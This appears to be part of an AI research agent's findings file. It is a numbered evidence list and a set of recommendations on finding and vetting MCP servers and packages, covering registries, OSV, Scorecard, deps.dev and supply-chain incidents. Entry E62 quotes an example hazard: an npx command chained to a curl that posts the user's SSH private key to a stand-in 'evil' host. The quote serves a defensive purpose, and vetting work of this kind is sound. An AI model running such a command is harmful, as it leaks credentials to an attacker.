- E5. https://modelcontextprotocol.io/registry/moderation-policy, 2026-10-16, Exa. Registry moderation is minimal. Quote: "consumers should assume minimal-to-no moderation."
- E6. https://github.com/modelcontextprotocol/registry/blob/main/complete.md, 2026-10-16, Exa. Registry deliberately has no quality ranking or curation. Quote: "Quality rankings: No built-in server quality assessments or rankings"
- E7. https://github.com/modelcontextprotocol/registry/blob/main/complete.md, 2026-10-16, Exa. Registry authors expect clients to use subregistries instead. Quote: "We highly recommend using a subregistry rather than fetching data from the official registry directly."
- E8. https://www.air.security/blog-posts/mcpjacking, 2026-10-16, Exa. Namespace check is not ownership forever: 155 official-registry entries relied on expired domains and were hijackable (Air Security, dated 2026-08-27). Quote: "We discovered 155 hijackable MCPs in the official worldwide marketplace used by millions of agents. Each relied on an expired domain"
- E9. https://github.blog/ai-and-ml/generative-ai/how-to-find-install-and-manage-mcp-servers-with-the-github-mcp-registry/, 2026-10-16, Exa (dated 2025-10-24). GitHub MCP Registry: 44 servers at launch, curated/partner-nominated, enterprise allow-list; web UI at github.com/mcp. Quote: "Currently, the GitHub MCP Registry has 44 MCP servers"; github.com/mcp returns 403 from this sandbox (session bound to repos), so not programmatically usable here.
- E10. https://code.claude.com/docs/en/plugins/anthropic-marketplaces, 2026-10-16, Exa. Claude Code official marketplace is auto-added; most entries come from partners. Quote: "Most of what it lists comes from partners and other authors rather than from Anthropic"
- E11. https://code.claude.com/docs/en/discover-plugins and the anthropic-marketplaces page, 2026-10-16, Exa. Community marketplace has automated screening, third-party marketplaces have none. Quotes: "have passed Anthropic's automated validation and safety screening" ; "Anthropic doesn't review third-party marketplaces"
- E12. https://code.claude.com/docs/en/plugins/anthropic-marketplaces, 2026-10-16, Exa. Catalog is a git file, so it is greppable: `.claude-plugin/marketplace.json` in anthropics/claude-plugins-official. Quote: "That file is the catalog itself."
- E13. https://claude.com/docs/connectors/directory and https://claude.com/docs/connectors/building/submission, 2026-10-16, Exa. Claude Connectors Directory serves Claude Code too; verification is not a security audit; default listing is Community after automated scan. Quotes: "Verification isn't a security audit." ; "lists it as a Community connector with no action from you."
- E14. https://docs.docker.com/ai/mcp-catalog-and-toolkit/toolkit, 2026-10-16, Exa. Docker MCP Catalog: curated, Docker-built and signed local servers, SBOM, browsable at hub.docker.com/mcp or `docker mcp catalog server ls`. Quote: "All MCP server images under `mcp/` in the MCP Catalog are built by Docker and digitally signed to verify their source and integrity."
- E15. https://docs.docker.com/ai/mcp-catalog-and-toolkit/toolkit, 2026-10-16, Exa. Docker Dynamic MCP lets an agent search the catalog and add servers mid-conversation. Quote: "enables AI agents to discover, add, and compose MCP servers on-demand during conversations"
- E16. live curl registry.smithery.ai/servers?q=attio (and q=stripe), 2026-10-16, curl. Smithery registry API is keyless for search and returns a `verified` flag and `useCount`: `q=attio` returned `attio` verified true, useCount 277, plus unverified zero-use entries created 2026-08 to 2026-10. Quote: "verified":true,"useCount":48 (response for q=stripe).
- E17. curl https://api.pulsemcp.com/v0.1/servers, 2026-10-16, curl. PulseMCP API needs a key. Quote: "Invalid or missing API key"
- E18. curl https://glama.ai/api/mcp/v1/servers, 2026-10-16, curl. Glama API needs a key and attribution licence. Quote: "This endpoint requires an API key."
- E19. curl https://mcp.so/api/servers?q=stripe, 2026-10-16, curl. mcp.so: `/api/servers?q=` returned the HTML app shell, no JSON API found. Quote: "<!DOCTYPE html>" (first bytes of response).
- E20. https://arxiv.org/html/2510.16558v2, 2026-10-16, Exa. Registry-scale quality problems: a DSN 2026 study of 67,057 servers (mid-2025 data) found dead links and re-registrable GitHub accounts. Quote: "we find 212 cases (15.37%) where the associated GitHub accounts are re-registrable, creating opportunities for attackers to hijack the corresponding servers."
- E21. https://arxiv.org/html/2608.00150, 2026-10-16, Exa. Abandonment/churn: July 2026 measurement. Quote: "41.6% of confirmed servers disappear within three days between consecutive measurement runs"
- E22. https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package, 2026-10-16, Exa (published 2025-09-25). Malicious server in registries, 2025: postmark-mcp backdoor from v1.0.16. Quote: "added a backdoor in version 1.0.16 that secretly BCC'd emails to an external server."
- E23. https://www.straiker.ai/blog/smartloader-clones-oura-ring-mcp-to-deploy-supply-chain-attack, 2026-10-16, Exa. Malicious server in registries, 2026: SmartLoader trojanized Oura MCP submitted to MCP Market (2026-02-05). Quote: "Traditional trust signals (GitHub stars, forks, contributor counts) can now be systematically fabricated"
- E24. https://www.helpnetsecurity.com/2026/02/24/npm-worm-sandworm-mode-supply-cain-attack/, 2026-10-16, Exa. Sandworm_Mode (2026-02-24): 19 typosquatted npm packages injected a rogue MCP server into Claude Code config. Quote: "injecting a rogue Model Context Protocol (MCP) server into their configuration."
- E25. https://www.trendaisecurity.com/en/resources-insights/deep-research/hunt-them-all-an-ai-powered-vulnerability-sweep-of-19-000-mcp-servers, 2026-10-16, Exa. Vulnerability rate: about 4% of 19,000 MCP repos estimated exploitable (2026-05-27). Quote: "we estimate that the number of exploitable vulnerabilities across the 19,000 repositories lies between 600 and 1,650"
- E26. http://github.com/punkpeye/awesome-mcp-servers, 2026-10-16, Exa. awesome-mcp-servers (punkpeye) exists as a large list, homepage glama.ai/mcp/servers; awesome lists exist but are community PR lists. Quote: "A collection of MCP servers."
- E27. https://docs.github.com/en/rest/search/search?apiVersion=2022-1128, 2026-10-16, Exa. GitHub search limits. Quote: "The Search code endpoint requires you to authenticate and limits you to 9 requests per minute. For unauthenticated requests, the rate limit allows you to make up to 10 requests per minute."
- E28. curl https://api.github.com/search/repositories?q=..., 2026-10-16, curl. GitHub search from this sandbox is blocked. Quote: "sessions are bound to their configured repositories. Use repository-scoped endpoints"
- E29. live curl `api.github.com/rate_limit`, 2026-10-16, curl. From the sandbox it showed `core` 15000 and `search` 30, i.e. an authenticated-style quota, while search endpoints returned 403. Quote: none recorded in the note; the note reports the values `core` 15000 and `search` 30.
- E30. curl https://registry.npmjs.org/-/v1/search, 2026-10-16, curl. npm search API is keyless and returns monthly/weekly downloads and dates, but is keyword-noisy: `text=mcp stripe` ranked "adscapi" (an ad-conversion SDK) first; `text=attio mcp` returned attio-mcp 1.7.0 (2026-08-25, 652 weekly) alongside attio-mcp-server 0.0.2 (2025-02-02). Quote: `"downloads":{"monthly":3583,"weekly":222}` (first result for the stripe query).
- E31. https://warehouse.pypa.io/api-reference/xml-rpc/, 2026-10-16, Exa. PyPI has no search API: XML-RPC search is disabled. Quote: "Permanently disabled due to excessive traffic driven by unidentified traffic, presumably automated."
- E32. https://docs.pypi.org/api/, 2026-10-16, Exa; curl 2026-10-16. PyPI JSON and Simple index work by exact name, keyless (`/pypi/requests/json` returned metadata). Quote: "Query PyPI's Index API or JSON API to determine where to download files from."
- E33. curl https://libraries.io/api/search?q=stripe, 2026-10-16, curl. libraries.io search needs a key. Quote: "An API key is required."
- E34. https://docs.deps.dev/api/v3/, 2026-10-16, Exa; curl api.deps.dev express returned `isDeprecated` per version. deps.dev API v3 is keyless, by exact package, returns licences, advisories, Scorecard and a deprecation flag; it has no free-text package search (only GetPackage/GetVersion/Query by name or hash). Quote: "GetVersion returns information about a specific package version, including its licenses and any security advisories known to affect it."
- E35. https://docs.deps.dev/api/v3/, 2026-10-16, Exa. deps.dev data sources include npm, PyPI, Maven, Go, Cargo, OSV and OpenSSF Scorecard. Quote: "OpenSSF Scorecard"
- E36. curl hub.docker.com `/v2/search/repositories?query=`, 2026-10-16, curl. Docker Hub search works keyless (returned 980 hits for `mcp/stripe`, mostly unrelated). Quote: `"count":980`
- E37. https://www.securityweek.com/new-sandworm_mode-supply-chain-attack-hits-npm/, 2026-10-16, Exa. Typosquatting is active on npm: 19 packages posing as developer and AI-coding utilities (Feb 2026). Quote: "Dubbed Sandworm_Mode, the attack was deployed through 19 packages published under two aliases, which relied on typosquatting"
- E38. /home/user/Autonomy-Research/research/findings/tool-routing.md:1-13 and :199-215, read 2026-10-16, Read. Local routing recommendation: Parallel first, Exa second opinion, official registry for MCP. Quote: "Parallel Search is the default for discovery and page reading"
- E39. /home/user/Autonomy-Research/research/findings/tool-routing.md (Implications, decision table), read 2026-10-16, Read. MCP row of the decision table. Quote: "curl registry `/v0.1/servers?search=` | Parallel web_search with `site:github.com mcp` phrasing"
- E40. /home/user/Autonomy-Research/research/findings/tool-routing.md (hand-off contract), read 2026-10-16, Read. Hand-off contract. Quote: "Every discovery result must be reduced to <= 3 URLs before any fetch"

**Vetting and registry (notes/vetting-and-registry.md)**
- E41. live curl https://api.scorecard.dev/projects/github.com/ossf/scorecard, 2026-10-16, curl. Scorecard REST API needs no key and answers fast; unscanned repos return 404 (so "no Scorecard" is a real state, not a pass): HTTP 200 in 0.57 s with JSON including "score":8.3; an unscanned repo returned 404 in 0.45 s. Quote: "\"score\":8.3,\"checks\":[{\"name\":\"Dependency-Update-Tool\",\"score\":10"
- E42. https://github.com/ossf/scorecard, 2026-10-16, WebFetch. Scorecard docs name the API host and data licence; weekly API scores omit three checks, and results are CDN-cached. Quote: "CI-Tests, Contributors, and Dependency-Update-Tool" (omitted from weekly scans because of API costs, per the page)
- E43. https://github.com/ossf/scorecard/blob/main/docs/checks.md, 2026-10-16, WebFetch. Scorecard checks carry risk levels (Dangerous-Workflow and Webhooks Critical; Maintained, Vulnerabilities, Signed-Releases, Token-Permissions High). Quote: "If there is at least one commit per week during the previous 90 days, the project receives the highest score."
- E44. https://google.github.io/osv.dev/api/, 2026-10-16, WebFetch. OSV API: no limits stated, `querybatch` for many packages. Quote: "Currently there are no limits on the API."
- E45. curl https://api.osv.dev/v1/querybatch, 2026-10-16, curl. OSV live: `POST /v1/querybatch` for lodash 4.17.20 and requests 2.19.0 returned HTTP 200 in 0.32 s with GHSA ids. Quote: "{\"results\":[{\"vulns\":[{\"id\":\"GHSA-29mw-wpgm-hmr9\""
- E46. https://docs.deps.dev/api/v3/, 2026-10-16, WebFetch. deps.dev API v3 is keyless: GetVersion returns licences and advisory keys, GetProject returns stars, licence and a Scorecard copy; the docs state no rate limit and permit caching. Quote: "Clients are expressly permitted to cache data served by the API."
- E47. live curl `/v3/systems/npm/packages/lodash/versions/4.17.20` (deps.dev), 2026-10-16, curl. deps.dev live: returned licences and advisory keys; project endpoint returned in 0.24 s. Quote: "\"licenses\":[\"MIT\"], \"advisoryKeys\":[{\"id\":\"GHSA-29mw-wpgm-hmr9\"}"
- E48. live curl (deps.dev project record for modelcontextprotocol/servers), 2026-10-16, curl. deps.dev shows licence "non-standard" (so licence field can be unclassified; read LICENSE). Quote: "\"license\":\"non-standard\""
- E49. https://docs.npmjs.com/generating-provenance-statements, 2026-10-16, WebFetch. npm provenance: Sigstore-signed link to source and build, explicitly not a safety guarantee; check with `npm audit signatures`; CI only on GitHub Actions or GitLab. Quote: "does not guarantee the package has no malicious code" (page statement as reported by WebFetch)
- E50. curl https://registry.npmjs.org/-/npm/v1/attestations/sigstore@2.3.1, 2026-10-16, curl. npm attestation lookup is keyless: returned 200 in 0.09 s with a publish predicate. Quote: "{\"attestations\":[{\"predicateType\":\"https://github.com/npm/attestation/tree/main/specs/publish/v0.1\""
- E51. https://docs.pypi.org/trusted-publishers/, 2026-10-16, WebFetch. PyPI trusted publishing replaces long-lived tokens with OIDC short-lived tokens. Quote: "only valid for 15 minutes from time of creation"
- E52. https://docs.pypi.org/attestations/, 2026-10-16, WebFetch. PyPI attestations let users verify the identity that published a file; page gives no consumer check procedure. Quote: "verify that a particular package was attested to by a particular identity"
- E53. https://updates.snyk.io/snyk-advisor-insights-are-now-part-of-security-snyk-io/, 2026-10-16, WebFetch. Snyk Advisor was migrated into security.snyk.io, announced 2 Feb 2026. Quote: "We’ve completed the migration of Snyk Advisor into security.snyk.io"
- E54. https://socket.dev/llms.txt, 2026-10-16, WebFetch. Socket Firewall free tier is keyless; hosted `depscore` MCP works without authentication. Quote: "The free tier (`sfw`) is zero-configuration: no account, no API key, no config files."
- E55. https://socket.dev/pricing, 2026-10-16, WebFetch. Socket Free plan: 1,000 scans/month, 500 API requests/hour, malicious-package blocking at install across 4 ecosystems. Quote: "1,000" (scans per month) / "500 / hour" (API quota) / "4" (firewall ecosystems), as returned by WebFetch
- E56. https://docs.github.com/en/rest/security-advisories/global-advisories, 2026-10-16, WebFetch. GitHub global advisories REST: list and get-by-GHSA endpoints with `ecosystem` and `affects` filters. Quote: "only advisories for these ecosystems will be returned" (WebFetch summary)
- E57. live curl api.securityscorecards.dev, 2026-10-16, curl. Another host, api.securityscorecards.dev, also answered 200 in the same run, so the older host still works. Quote: none recorded in the note; the note reports HTTP 200.
- E58. https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html, 2026-10-16, WebFetch. OWASP defines tool poisoning and rug pull; pin hashes of the whole definition incl. annotations; typosquatting is a named vector. Quote: "A server changes its tool definitions after initial user approval, turning a trusted tool malicious."
- E59. same page, 2026-10-16, WebFetch. Pin with hashes and review on change. Quote: "Pin reviewed tool definitions using cryptographic hashes and require review when they change."
- E60. same page, 2026-10-16, WebFetch. Typosquat check. Quote: "typosquatting (e.g., mcp-server-filesystem vs mcp-server-filesytem) is a common attack vector."
- E61. https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices, 2026-10-16, WebFetch. MCP spec best practices on local servers: a malicious startup command in a config is an attack; client must show the exact command and sandbox. Quote: "Execute MCP server commands in a sandboxed environment with minimal default privileges"
- E62. same page, 2026-10-16, WebFetch. Example hazard. Quote: "npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location"
- E63. same page, 2026-10-16, WebFetch. Scope minimisation: broad wildcard scopes enlarge blast radius. Quote: "Publishing all possible scopes in `scopes_supported`" (listed under Common Mistakes)
- E64. same page, 2026-10-16, WebFetch. Also lists SSRF via OAuth discovery URLs and says not to hand-roll IP validation. Quote: "Avoid implementing IP validation manually."
- E65. https://genai.owasp.org/download/51928/, 2026-10-16, PDF text via pdftotext. OWASP third-party MCP guide sets a governance flow: submit with hash of tool descriptions, scan, review, staging probation, re-scan. Quote: "Periodic Re-validation: Servers are automatically re-scanned at regular intervals or when versions change."
- E66. same guide, 2026-10-16, pdftotext. Pin versions, record approvals in the registry. Quote: "Record Human Approvals: Log all security and domain-owner approvals in the registry. Monitor and alert on drift from the approved server inventory."
- E67. https://github.com/snyk/agent-scan README.md:55 (commit 3550263), read 2026-10-16, git clone + grep. Snyk agent-scan repo (the mcp-scan lineage): Apache-2.0, version 0.6.9, last commit 2026-10-15; scans MCP servers and skills for prompt injection, tool poisoning, shadowing, toxic flows, malware payloads. Quote: "IMPORTANT: Scanning MCP configurations can execute commands or make outbound network requests."
- E68. https://github.com/snyk/agent-scan README.md:256 (commit 3550263), read 2026-10-16, git clone + grep. That README still links the Invariant Labs blog posts, and reports to a "Snyk Evo" service in background mode. Quote: "reports the results to a [Snyk Evo](https://evo.ai.snyk.io) instance"
- E69. /home/user/Autonomy-Research/plugin/skills/repo-triage/SKILL.md:33-46, read 2026-10-16, Read. repo-triage covers metadata, shallow clone, install-surface files and greps, DeepWiki first pass, Scorecard viewer, three-level verdict. Quote: "Scorecard: fetch `https://scorecard.dev/viewer/?uri=github.com/<owner>/<repo>`. Note `Maintained`, `Dangerous-Workflow`, `Binary-Artifacts`, `Pinned-Dependencies`."
- E70. /home/user/Autonomy-Research/plugin/skills/repo-triage/SKILL.md:37-41, read 2026-10-16, Read. repo-triage lists the install files to read. Quote: "`package.json` (`scripts` such as `preinstall`/`postinstall`/`prepare`), `setup.py`, `pyproject.toml`"
- E71. /home/user/Autonomy-Research/plugin/skills/repo-triage/SKILL.md:47, read 2026-10-16, Read. repo-triage verdict set is coarse. Quote: "Verdict: `low risk`, `needs a human look` or `do not install`"
- E72. /home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:43-44, read 2026-10-16, Read. tool-scan does a six-step judge with the same Scorecard viewer and says to use repo-triage for safe-to-install. Quote: "For a safe-to-install verdict use `repo-triage`."
- E73. /home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:35, read 2026-10-16, Read. tool-scan MCP discovery uses the official registry API only. Quote: "`GET https://registry.modelcontextprotocol.io/v0.1/servers?search=<q>&limit=5`"
- E74. /home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:46-47 (vetting-and-registry.md) and :44-46 (procedure-and-agent-changes.md), read 2026-10-16, Read. Registry row has six columns only; it is the format workers return. Quote: "`ROW: | <Tool> | <Link> | <What it does, incl. install surface> | <Where it runs> | <Verified YYYY-MM-DD> | <Verdict> |`"
- E75. /home/user/Autonomy-Research/research/tool-registry.md:9-10, read 2026-10-16, Read. Registry header, current schema. Quote: "| Tool | Link | What it does | Where it runs | Verified | Verdict |"
- E76. /home/user/Autonomy-Research/research/tool-registry.md:3-5, read 2026-10-16, Read. Registry intro says evidence lives in findings files. Quote: "Verdicts as of the verified date; details and the evidence behind each verdict are in `research/findings/`"
- E77. /home/user/Autonomy-Research/research/tool-registry.md:63, read 2026-10-16, Read. Rows already mix verification depth in the Verified cell. Quote: "not opened (search excerpt only)"
- E78. https://www.thoughtworks.com/insights/blog/technology-strategy/how-to-create-your-enterprise-technology-radar, 2026-10-16, WebFetch. Thoughtworks process for existing entries and fading: re-review everything each edition; entries unchanged for two editions fade. Quote: "If a blip has stayed put for two radars (one year), we let it fade away, reducing clutter."
- E79. https://genai.owasp.org/download/51928/, 2026-10-16, pdftotext. OWASP governance: approved-server registry with version pins, recorded approvals, drift alerts, periodic re-scan. Quote: "Pin Versions: Maintain a manifest of approved server and tool versions."

**Decision procedure, envelope and agent changes (notes/procedure-and-agent-changes.md)**
- E80. https://claude.com/blog/skills-explained, 2026-10-16, WebFetch. MCP connects, skills teach: connectors give access to a service, skills carry the procedure. Anthropic recommends both together. Quote: "MCP connects Claude to data; Skills teach Claude what to do with that data."
- E81. https://www.anthropic.com/engineering/code-execution-with-mcp, 2026-10-16, WebFetch. Loading every tool definition and passing every intermediate result through the model is costly, and code execution cuts it, at an operations price. Quote: "reduces the token usage from 150,000 tokens to 2,000 tokens."
- E82. same post, 2026-10-16, WebFetch. The cost side of the code route. Quote: "These infrastructure requirements add operational overhead and security considerations that direct tool calls avoid."
- E83. same post, 2026-10-16, WebFetch. Secrets: code execution lets data be tokenised so the agent does not handle it. Quote: "This prevents the agent from accidentally logging or processing sensitive data."
- E84. https://blog.cloudflare.com/code-mode/, 2026-10-16, WebFetch. Cloudflare Code Mode: models write code against MCP-derived APIs better than they call tools. Quote: "LLMs are better at writing code to call MCP, than at calling MCP directly."
- E85. https://blog.cloudflare.com/code-mode/, 2026-10-16, WebFetch. Code Mode secrets model: bindings hold authorisation, the sandbox cannot leak keys. Quote: "This means that the AI cannot possibly write code that leaks any keys."
- E86. https://code.claude.com/docs/en/mcp, 2026-10-16, WebFetch. Claude Code defers MCP tool definitions by default, so the "schemas bloat context" criterion is largely configured away on current models. Quote: "Only tool names and server instructions load at session start, so adding more MCP servers has minimal impact on your context window."
- E87. https://code.claude.com/docs/en/mcp, 2026-10-16, WebFetch. Tool search is off on a non-first-party base URL and on pre-Sonnet-4 models (relevant if the engineer runs behind a proxy). Quote: "Claude Code disables it when `ANTHROPIC_BASE_URL` points to a non-first-party host, since most proxies don't forward `tool_reference` blocks."
- E88. https://code.claude.com/docs/en/mcp, 2026-10-16, WebFetch. Claude Code prompts for MCP writes per call and can mark a tool as always needing a human. Quote: "Claude Code shows that tool's permission prompt on every call, even in `acceptEdits`, `auto`, and `bypassPermissions` permission modes"
- E89. https://code.claude.com/docs/en/mcp, 2026-10-16, WebFetch. Third-party MCP servers carry prompt-injection risk; verify trust before connecting. Quote: "Servers that fetch external content can expose you to prompt injection risk."
- E90. https://code.claude.com/docs/en/mcp, 2026-10-16, WebFetch. Output cap: MCP results over 10,000 tokens warn, default max 25,000. Quote: "the default maximum is 25,000 tokens"
- E91. https://www.anthropic.com/engineering/writing-tools-for-agents, 2026-10-16, WebFetch. Tool design: wrapping every endpoint is a weak tool; consolidate and return high-signal output. Quote: "tool implementations should take care to return only high signal information back to agents."
- E92. https://arxiv.org/abs/2608.08654, 2026-10-16, WebFetch. Controlled-ish measurement 2026: the scaffolding, not the protocol, dominated cost; CLI-only scaffoldings were cheaper and finished every run; MCP failures cost more. Quote: "12.9 per cent of the money spent on MCP runs bought no completed work against 2.2 per cent on CLI runs"
- E93. https://arxiv.org/abs/2608.08654, 2026-10-16, WebFetch. Same paper, caution on the headline ratios. Quote: "thirteen strictly paired MCP-to-CLI ratios span 0.43x to 29x, with outliers on both sides."
- E94. /home/user/Autonomy-Research/research/findings/engineer-browser.md:Q11 table (line 522 onward), read 2026-10-16, Read. Per-task API-versus-browser table already settled in the repo: Attio objects/attributes/lists by REST, views and Workflows need the browser; Clay tables cannot be created programmatically. Quote: "you **cannot** create tables programmatically"
- E95. /home/user/Autonomy-Research/research/tool-registry.md:204-210, read 2026-10-16, Read. Tool registry carries the browser stack verdicts (Playwright CLI primary, MCP alternate, Stagehand only as optional replay). Quote: "**Use**: primary driver for the engineer; spike on real Attio/Clay tasks"
- E96. https://www.anthropic.com/engineering/multi-agent-research-system, 2026-10-16, WebFetch. Anthropic's effort scaling: simple 1 agent 3-10 calls; comparisons 2-4 subagents with 10-15 calls each. Quote: "direct comparisons might need 2-4 subagents with 10-15 calls each"
- E97. same post, 2026-10-16, WebFetch. Simple fact-finding. Quote: "Simple fact-finding requires just 1 agent with 3-10 tool calls"
- E98. same post, 2026-10-16, WebFetch. Cost of multi-agent. Quote: "multi-agent systems use about 15× more tokens than chats"
- E99. same post, 2026-10-16, WebFetch. Start broad then narrow. Quote: "start with short, broad queries, evaluate what's available, then progressively narrow focus."
- E100. same post, 2026-10-16, WebFetch. Anthropic's post ties quality to spending more tokens (from the note's Contradictions). Quote: "token usage by itself explains 80% of the variance"
- E101. https://arxiv.org/html/2603.08877v1, 2026-10-16, WebFetch. Search depth plateau in a controlled budgeted-search study (QA benchmarks, six LLMs). Quote: "Increasing search steps yields consistent gains up to roughly three searches, after which returns plateau."
- E102. https://arxiv.org/abs/2608.01913, 2026-10-16, WebFetch. Search effort weakly tracks answer quality; stop on evidence sufficiency. Quote: "Across settings, we find that search effort and answer quality are only weakly aligned."
- E103. https://arxiv.org/abs/2608.01913, 2026-10-16, WebFetch. Same paper, stop criteria. Quote: "stopping criteria based on whether sufficient supporting evidence has been retrieved."
- E104. /home/user/Autonomy-Research/plugin/skills/research/SKILL.md:36-42, read 2026-10-16, Read. Research skill effort table and caps (what the build-time envelope must be smaller than). Quote: "| Hard cap | 8 | - | Never more than 8 workers in a run, gap round included. |"
- E105. /home/user/Autonomy-Research/plugin/skills/research/SKILL.md:221-225, read 2026-10-16, Read. Research skill: single gap round, worker cuts to three URLs. Quote: "When a search returns more than three candidate URLs, the worker shall select at most three before any fetch."
- E106. /home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:13-15, read 2026-10-16, Read. Tool-scan: at most 8 workers, one per cluster, six steps per candidate. Quote: "one per candidate cluster, at most 8"
- E107. Autonomy-Research/feasibility finding citing plugin/agents/spike-worker.md:6,79, read via /home/user/Autonomy-Research/research/findings/engineer-feasibility.md:262, 2026-10-16, Read. Spike worker caps (turns and calls). Quote: "caps are "maxTurns: 40" and "Stop at about 15 tool calls.""
- E108. /home/user/Autonomy-Research/research/tool-registry.md:181, read 2026-10-16, Read. Claude Code caps for unattended runs exist (`--max-turns`, `--max-budget-usd`). Quote: "Per-run turn and estimated-spend caps; `error_max_turns` / `error_max_budget_usd` result subtypes; default none"
- E109. /home/user/Autonomy-Research/plugin/skills/interview/SKILL.md:8-11, read 2026-10-16, Read. Interview needs no workers and fetches nothing. Quote: "The interview is conversation with the user; it needs no workers and fetches no pages."
- E110. /home/user/Autonomy-Research/plugin/skills/interview/SKILL.md:47-48, read 2026-10-16, Read. Interview: reconnaissance is opt-in only. Quote: "Offer repo or web reconnaissance as an option; do not start it unasked."
- E111. /home/user/Autonomy-Research/plugin/skills/interview/SKILL.md:12-14, read 2026-10-16, Read. Interview output path is research/requirements, not the engineer's repo. Quote: "tell the user the output path `research/requirements/<slug>.md`."
- E112. /home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:21-23, read 2026-10-16, Read. Tool-scan never installs or runs. Quote: "The scan shall never install, build or run a candidate or any script from it."
- E113. /home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:16-19, read 2026-10-16, Read. Tool-scan logs only to the registry; the lead writes rows after all workers return. Quote: "the lead shall write the registry rows, one at a time, from those `ROW:` lines."
- E114. /home/user/Autonomy-Research/plugin/skills/spike/SKILL.md:14-15, read 2026-10-16, Read. Spike tests only named paths. Quote: "The skill shall test only paths the user named, and shall not add a path of its own."
- E115. /home/user/Autonomy-Research/plugin/skills/spike/SKILL.md:27-29, read 2026-10-16, Read. Spike gives no credentials. Quote: "The skill shall give a worker no credentials beyond read-only search keys."
- E116. /home/user/Autonomy-Research/plugin/skills/spike/SKILL.md:52-53,64, read 2026-10-16, Read. Spike confirms with the user and writes to research/spikes. Quote: "Confirm the question, the named paths (one to three) and the probe with the user in one message."
- E117. /home/user/Autonomy-Research/plugin/skills/research/SKILL.md:26-27, read 2026-10-16, Read. Research lead never reads sources itself. Quote: "never fetch, search or read a source yourself;"
- E118. /home/user/Autonomy-Research/research/findings/engineer-feasibility.md:245-270, read 2026-10-16, Read. Earlier-run spike gaps (13 numbered gaps). Quote: "Path cap and source: make the cap configurable and use a pre-authorised path list written at intake."
- E119. /home/user/Autonomy-Research/research/findings/engineer-intake.md:65-72, read 2026-10-16, Read. Earlier-run interview gaps (7 inferences). Quote: "an explicit "I don't know" path that triggers exploration instead of recording a gap"
- E120. /home/user/Autonomy-Research/research/findings/engineer-feasibility.md:598, read 2026-10-16, Read. Dead-end lookup requirement. Quote: "When a candidate path matches a `dead-ends.md` entry, the engineer shall state the prior result and shall not dispatch a trial unless the entry's `retry-when` condition holds."
- E121. /home/user/Autonomy-Research/research/findings/engineer-feasibility.md:109, read 2026-10-16, Read. Dead-ends record proposal. Quote: "path, date, version or commit tested, probe, result, evidence location (command and output), `retry-when` condition"
- E122. /home/user/Autonomy-Research/research/findings/engineer-feasibility.md:301, read 2026-10-16, Read. Integration cards come from a 12-point checklist and feed the setup list. Quote: "One ordered page from the integration cards, long waits first"
- E123. /home/user/Autonomy-Research/plugin/skills/research/note-schema.md:14-16, read 2026-10-16, Read. Note schema already forces claim + URL + quote, so a card can copy a finding verbatim. Quote: "The claim says no more than the quote does."

**Earlier findings built on (the synthesizer's named inputs, read 2026-10-16, Read)**
- E124. /home/user/Autonomy-Research/research/findings/tool-routing.md:154. The earlier routing finding rated Smithery "Skip". Quote: "no search API documented"
- E125. /home/user/Autonomy-Research/research/findings/engineer-feasibility.md:296. The feasibility protocol bounds fix attempts per blocker. Quote: "after two failed fixes on one blocker, record and stop"
- E126. /home/user/Autonomy-Research/research/findings/engineer-feasibility.md:592. Step 0 of both spike modes is a lookup. Quote: "Grep a `dead-ends.md` file and the tool registry for each candidate before dispatch."

## Implications for the researcher plugin

These are recommendations only. Nothing in `plugin/` is changed this pass. Each item is the worker's design unless it is cited.

1. **Research skill: a build-mode switch.**
   - Tiers D0-D2 with a worker cap of 3, today's hard cap being 8 (E104).
   - A 10-minute box and no gap round.
   - The lead may do D0 inline in at most two content calls.
   - Outputs go to the engineer's repo, not `research/findings/`.
   - For D0 and D1, skip the synthesizer and verifier, and instead open the primary URL and quote it.
2. **Tool-scan.**
   - A stop-at-first-pass mode.
   - A capability-card input (operations needed, auth John can complete, writes required).
   - The decision-procedure result (script, MCP or browser) recorded in the row.
   - Read `dead-ends.md` first (E120, E126).
   - Add to MCP discovery, which today is the official registry only (E73): `version=latest`, a vendor-namespace filter and a 60 s timeout, with the later ladder rungs as fallbacks.
3. **Repo-triage and tool-scan vetting.** These are the worker's 11 gaps, each with its fix.
   1. Add an OSV `querybatch` advisory step (E44, E45), recording "0 known" versus "unchecked".
   2. Switch Scorecard from the viewer (E69) to the API (E41), with 404 meaning "unavailable".
   3. Add a licence step using deps.dev and the LICENSE file (E46-E48). AGPL, FSL and non-standard licences mean a human look.
   4. Add a footprint check: dependency counts from deps.dev, plus whether the tool needs Docker, a daemon or network.
   5. Inspect the published manifest scripts and provenance, because the published tarball can differ from the repo (E49, E50).
   6. Add a typosquat and malware check: Socket `sfw` (E54) and OSV MAL- advisories.
   7. Add the MCP static checks (E58-E64), a tool-definition hash and an optional agent-scan run in a sandbox (E67).
   8. Record the version or SHA checked.
   9. Leave fit-to-need to the decision procedure.
   10. Add a path that works without DeepWiki.
   11. Align the verdict vocabulary between the triage levels (E71) and the registry's verdicts.
4. **Registry.** Add the Meta cell or sidecar fields: `version_checked`, `source_depth`, `verdict_code`, `risk`, `recheck_by`, `trigger`, `superseded_by` and the MCP fields. Add a staleness script and an archive section (Q6). Keep the six-column `ROW:` contract (E74, E75).
5. **All skills.**
   - Configurable output paths through a project file.
   - A `re-check after` field next to `Verified`.
   - The dispatch brief shows Today and the box.
6. **Spike and interview.** Carry the earlier change lists (E118, E119), plus a dead-end lookup, riskiest-first ordering and an `inconclusive` verdict at the end of the box.
7. **Engineer side.** A PreToolUse or SessionStart reminder to grep `dead-ends.md` and the registry before choosing a tool. Whether it changes behaviour is a spike item, as in engineer-feasibility.

**EARS requirements** (worker inference):
- When the engineer needs a capability with no known tool, it shall grep `dead-ends.md` and the tool registry before any search.
- When a discovery pass reaches its time box with no passing candidate, the engineer shall record an `inconclusive` dead-end and flag it to John.
- When a candidate is an MCP server, the engineer shall record its launch command, scopes, local or remote status, and a hash of its tool definitions before use.
- When a registry row's `recheck_by` date has passed or its checked version is behind the latest release, the staleness check shall list it for re-triage.

## Tools evaluated

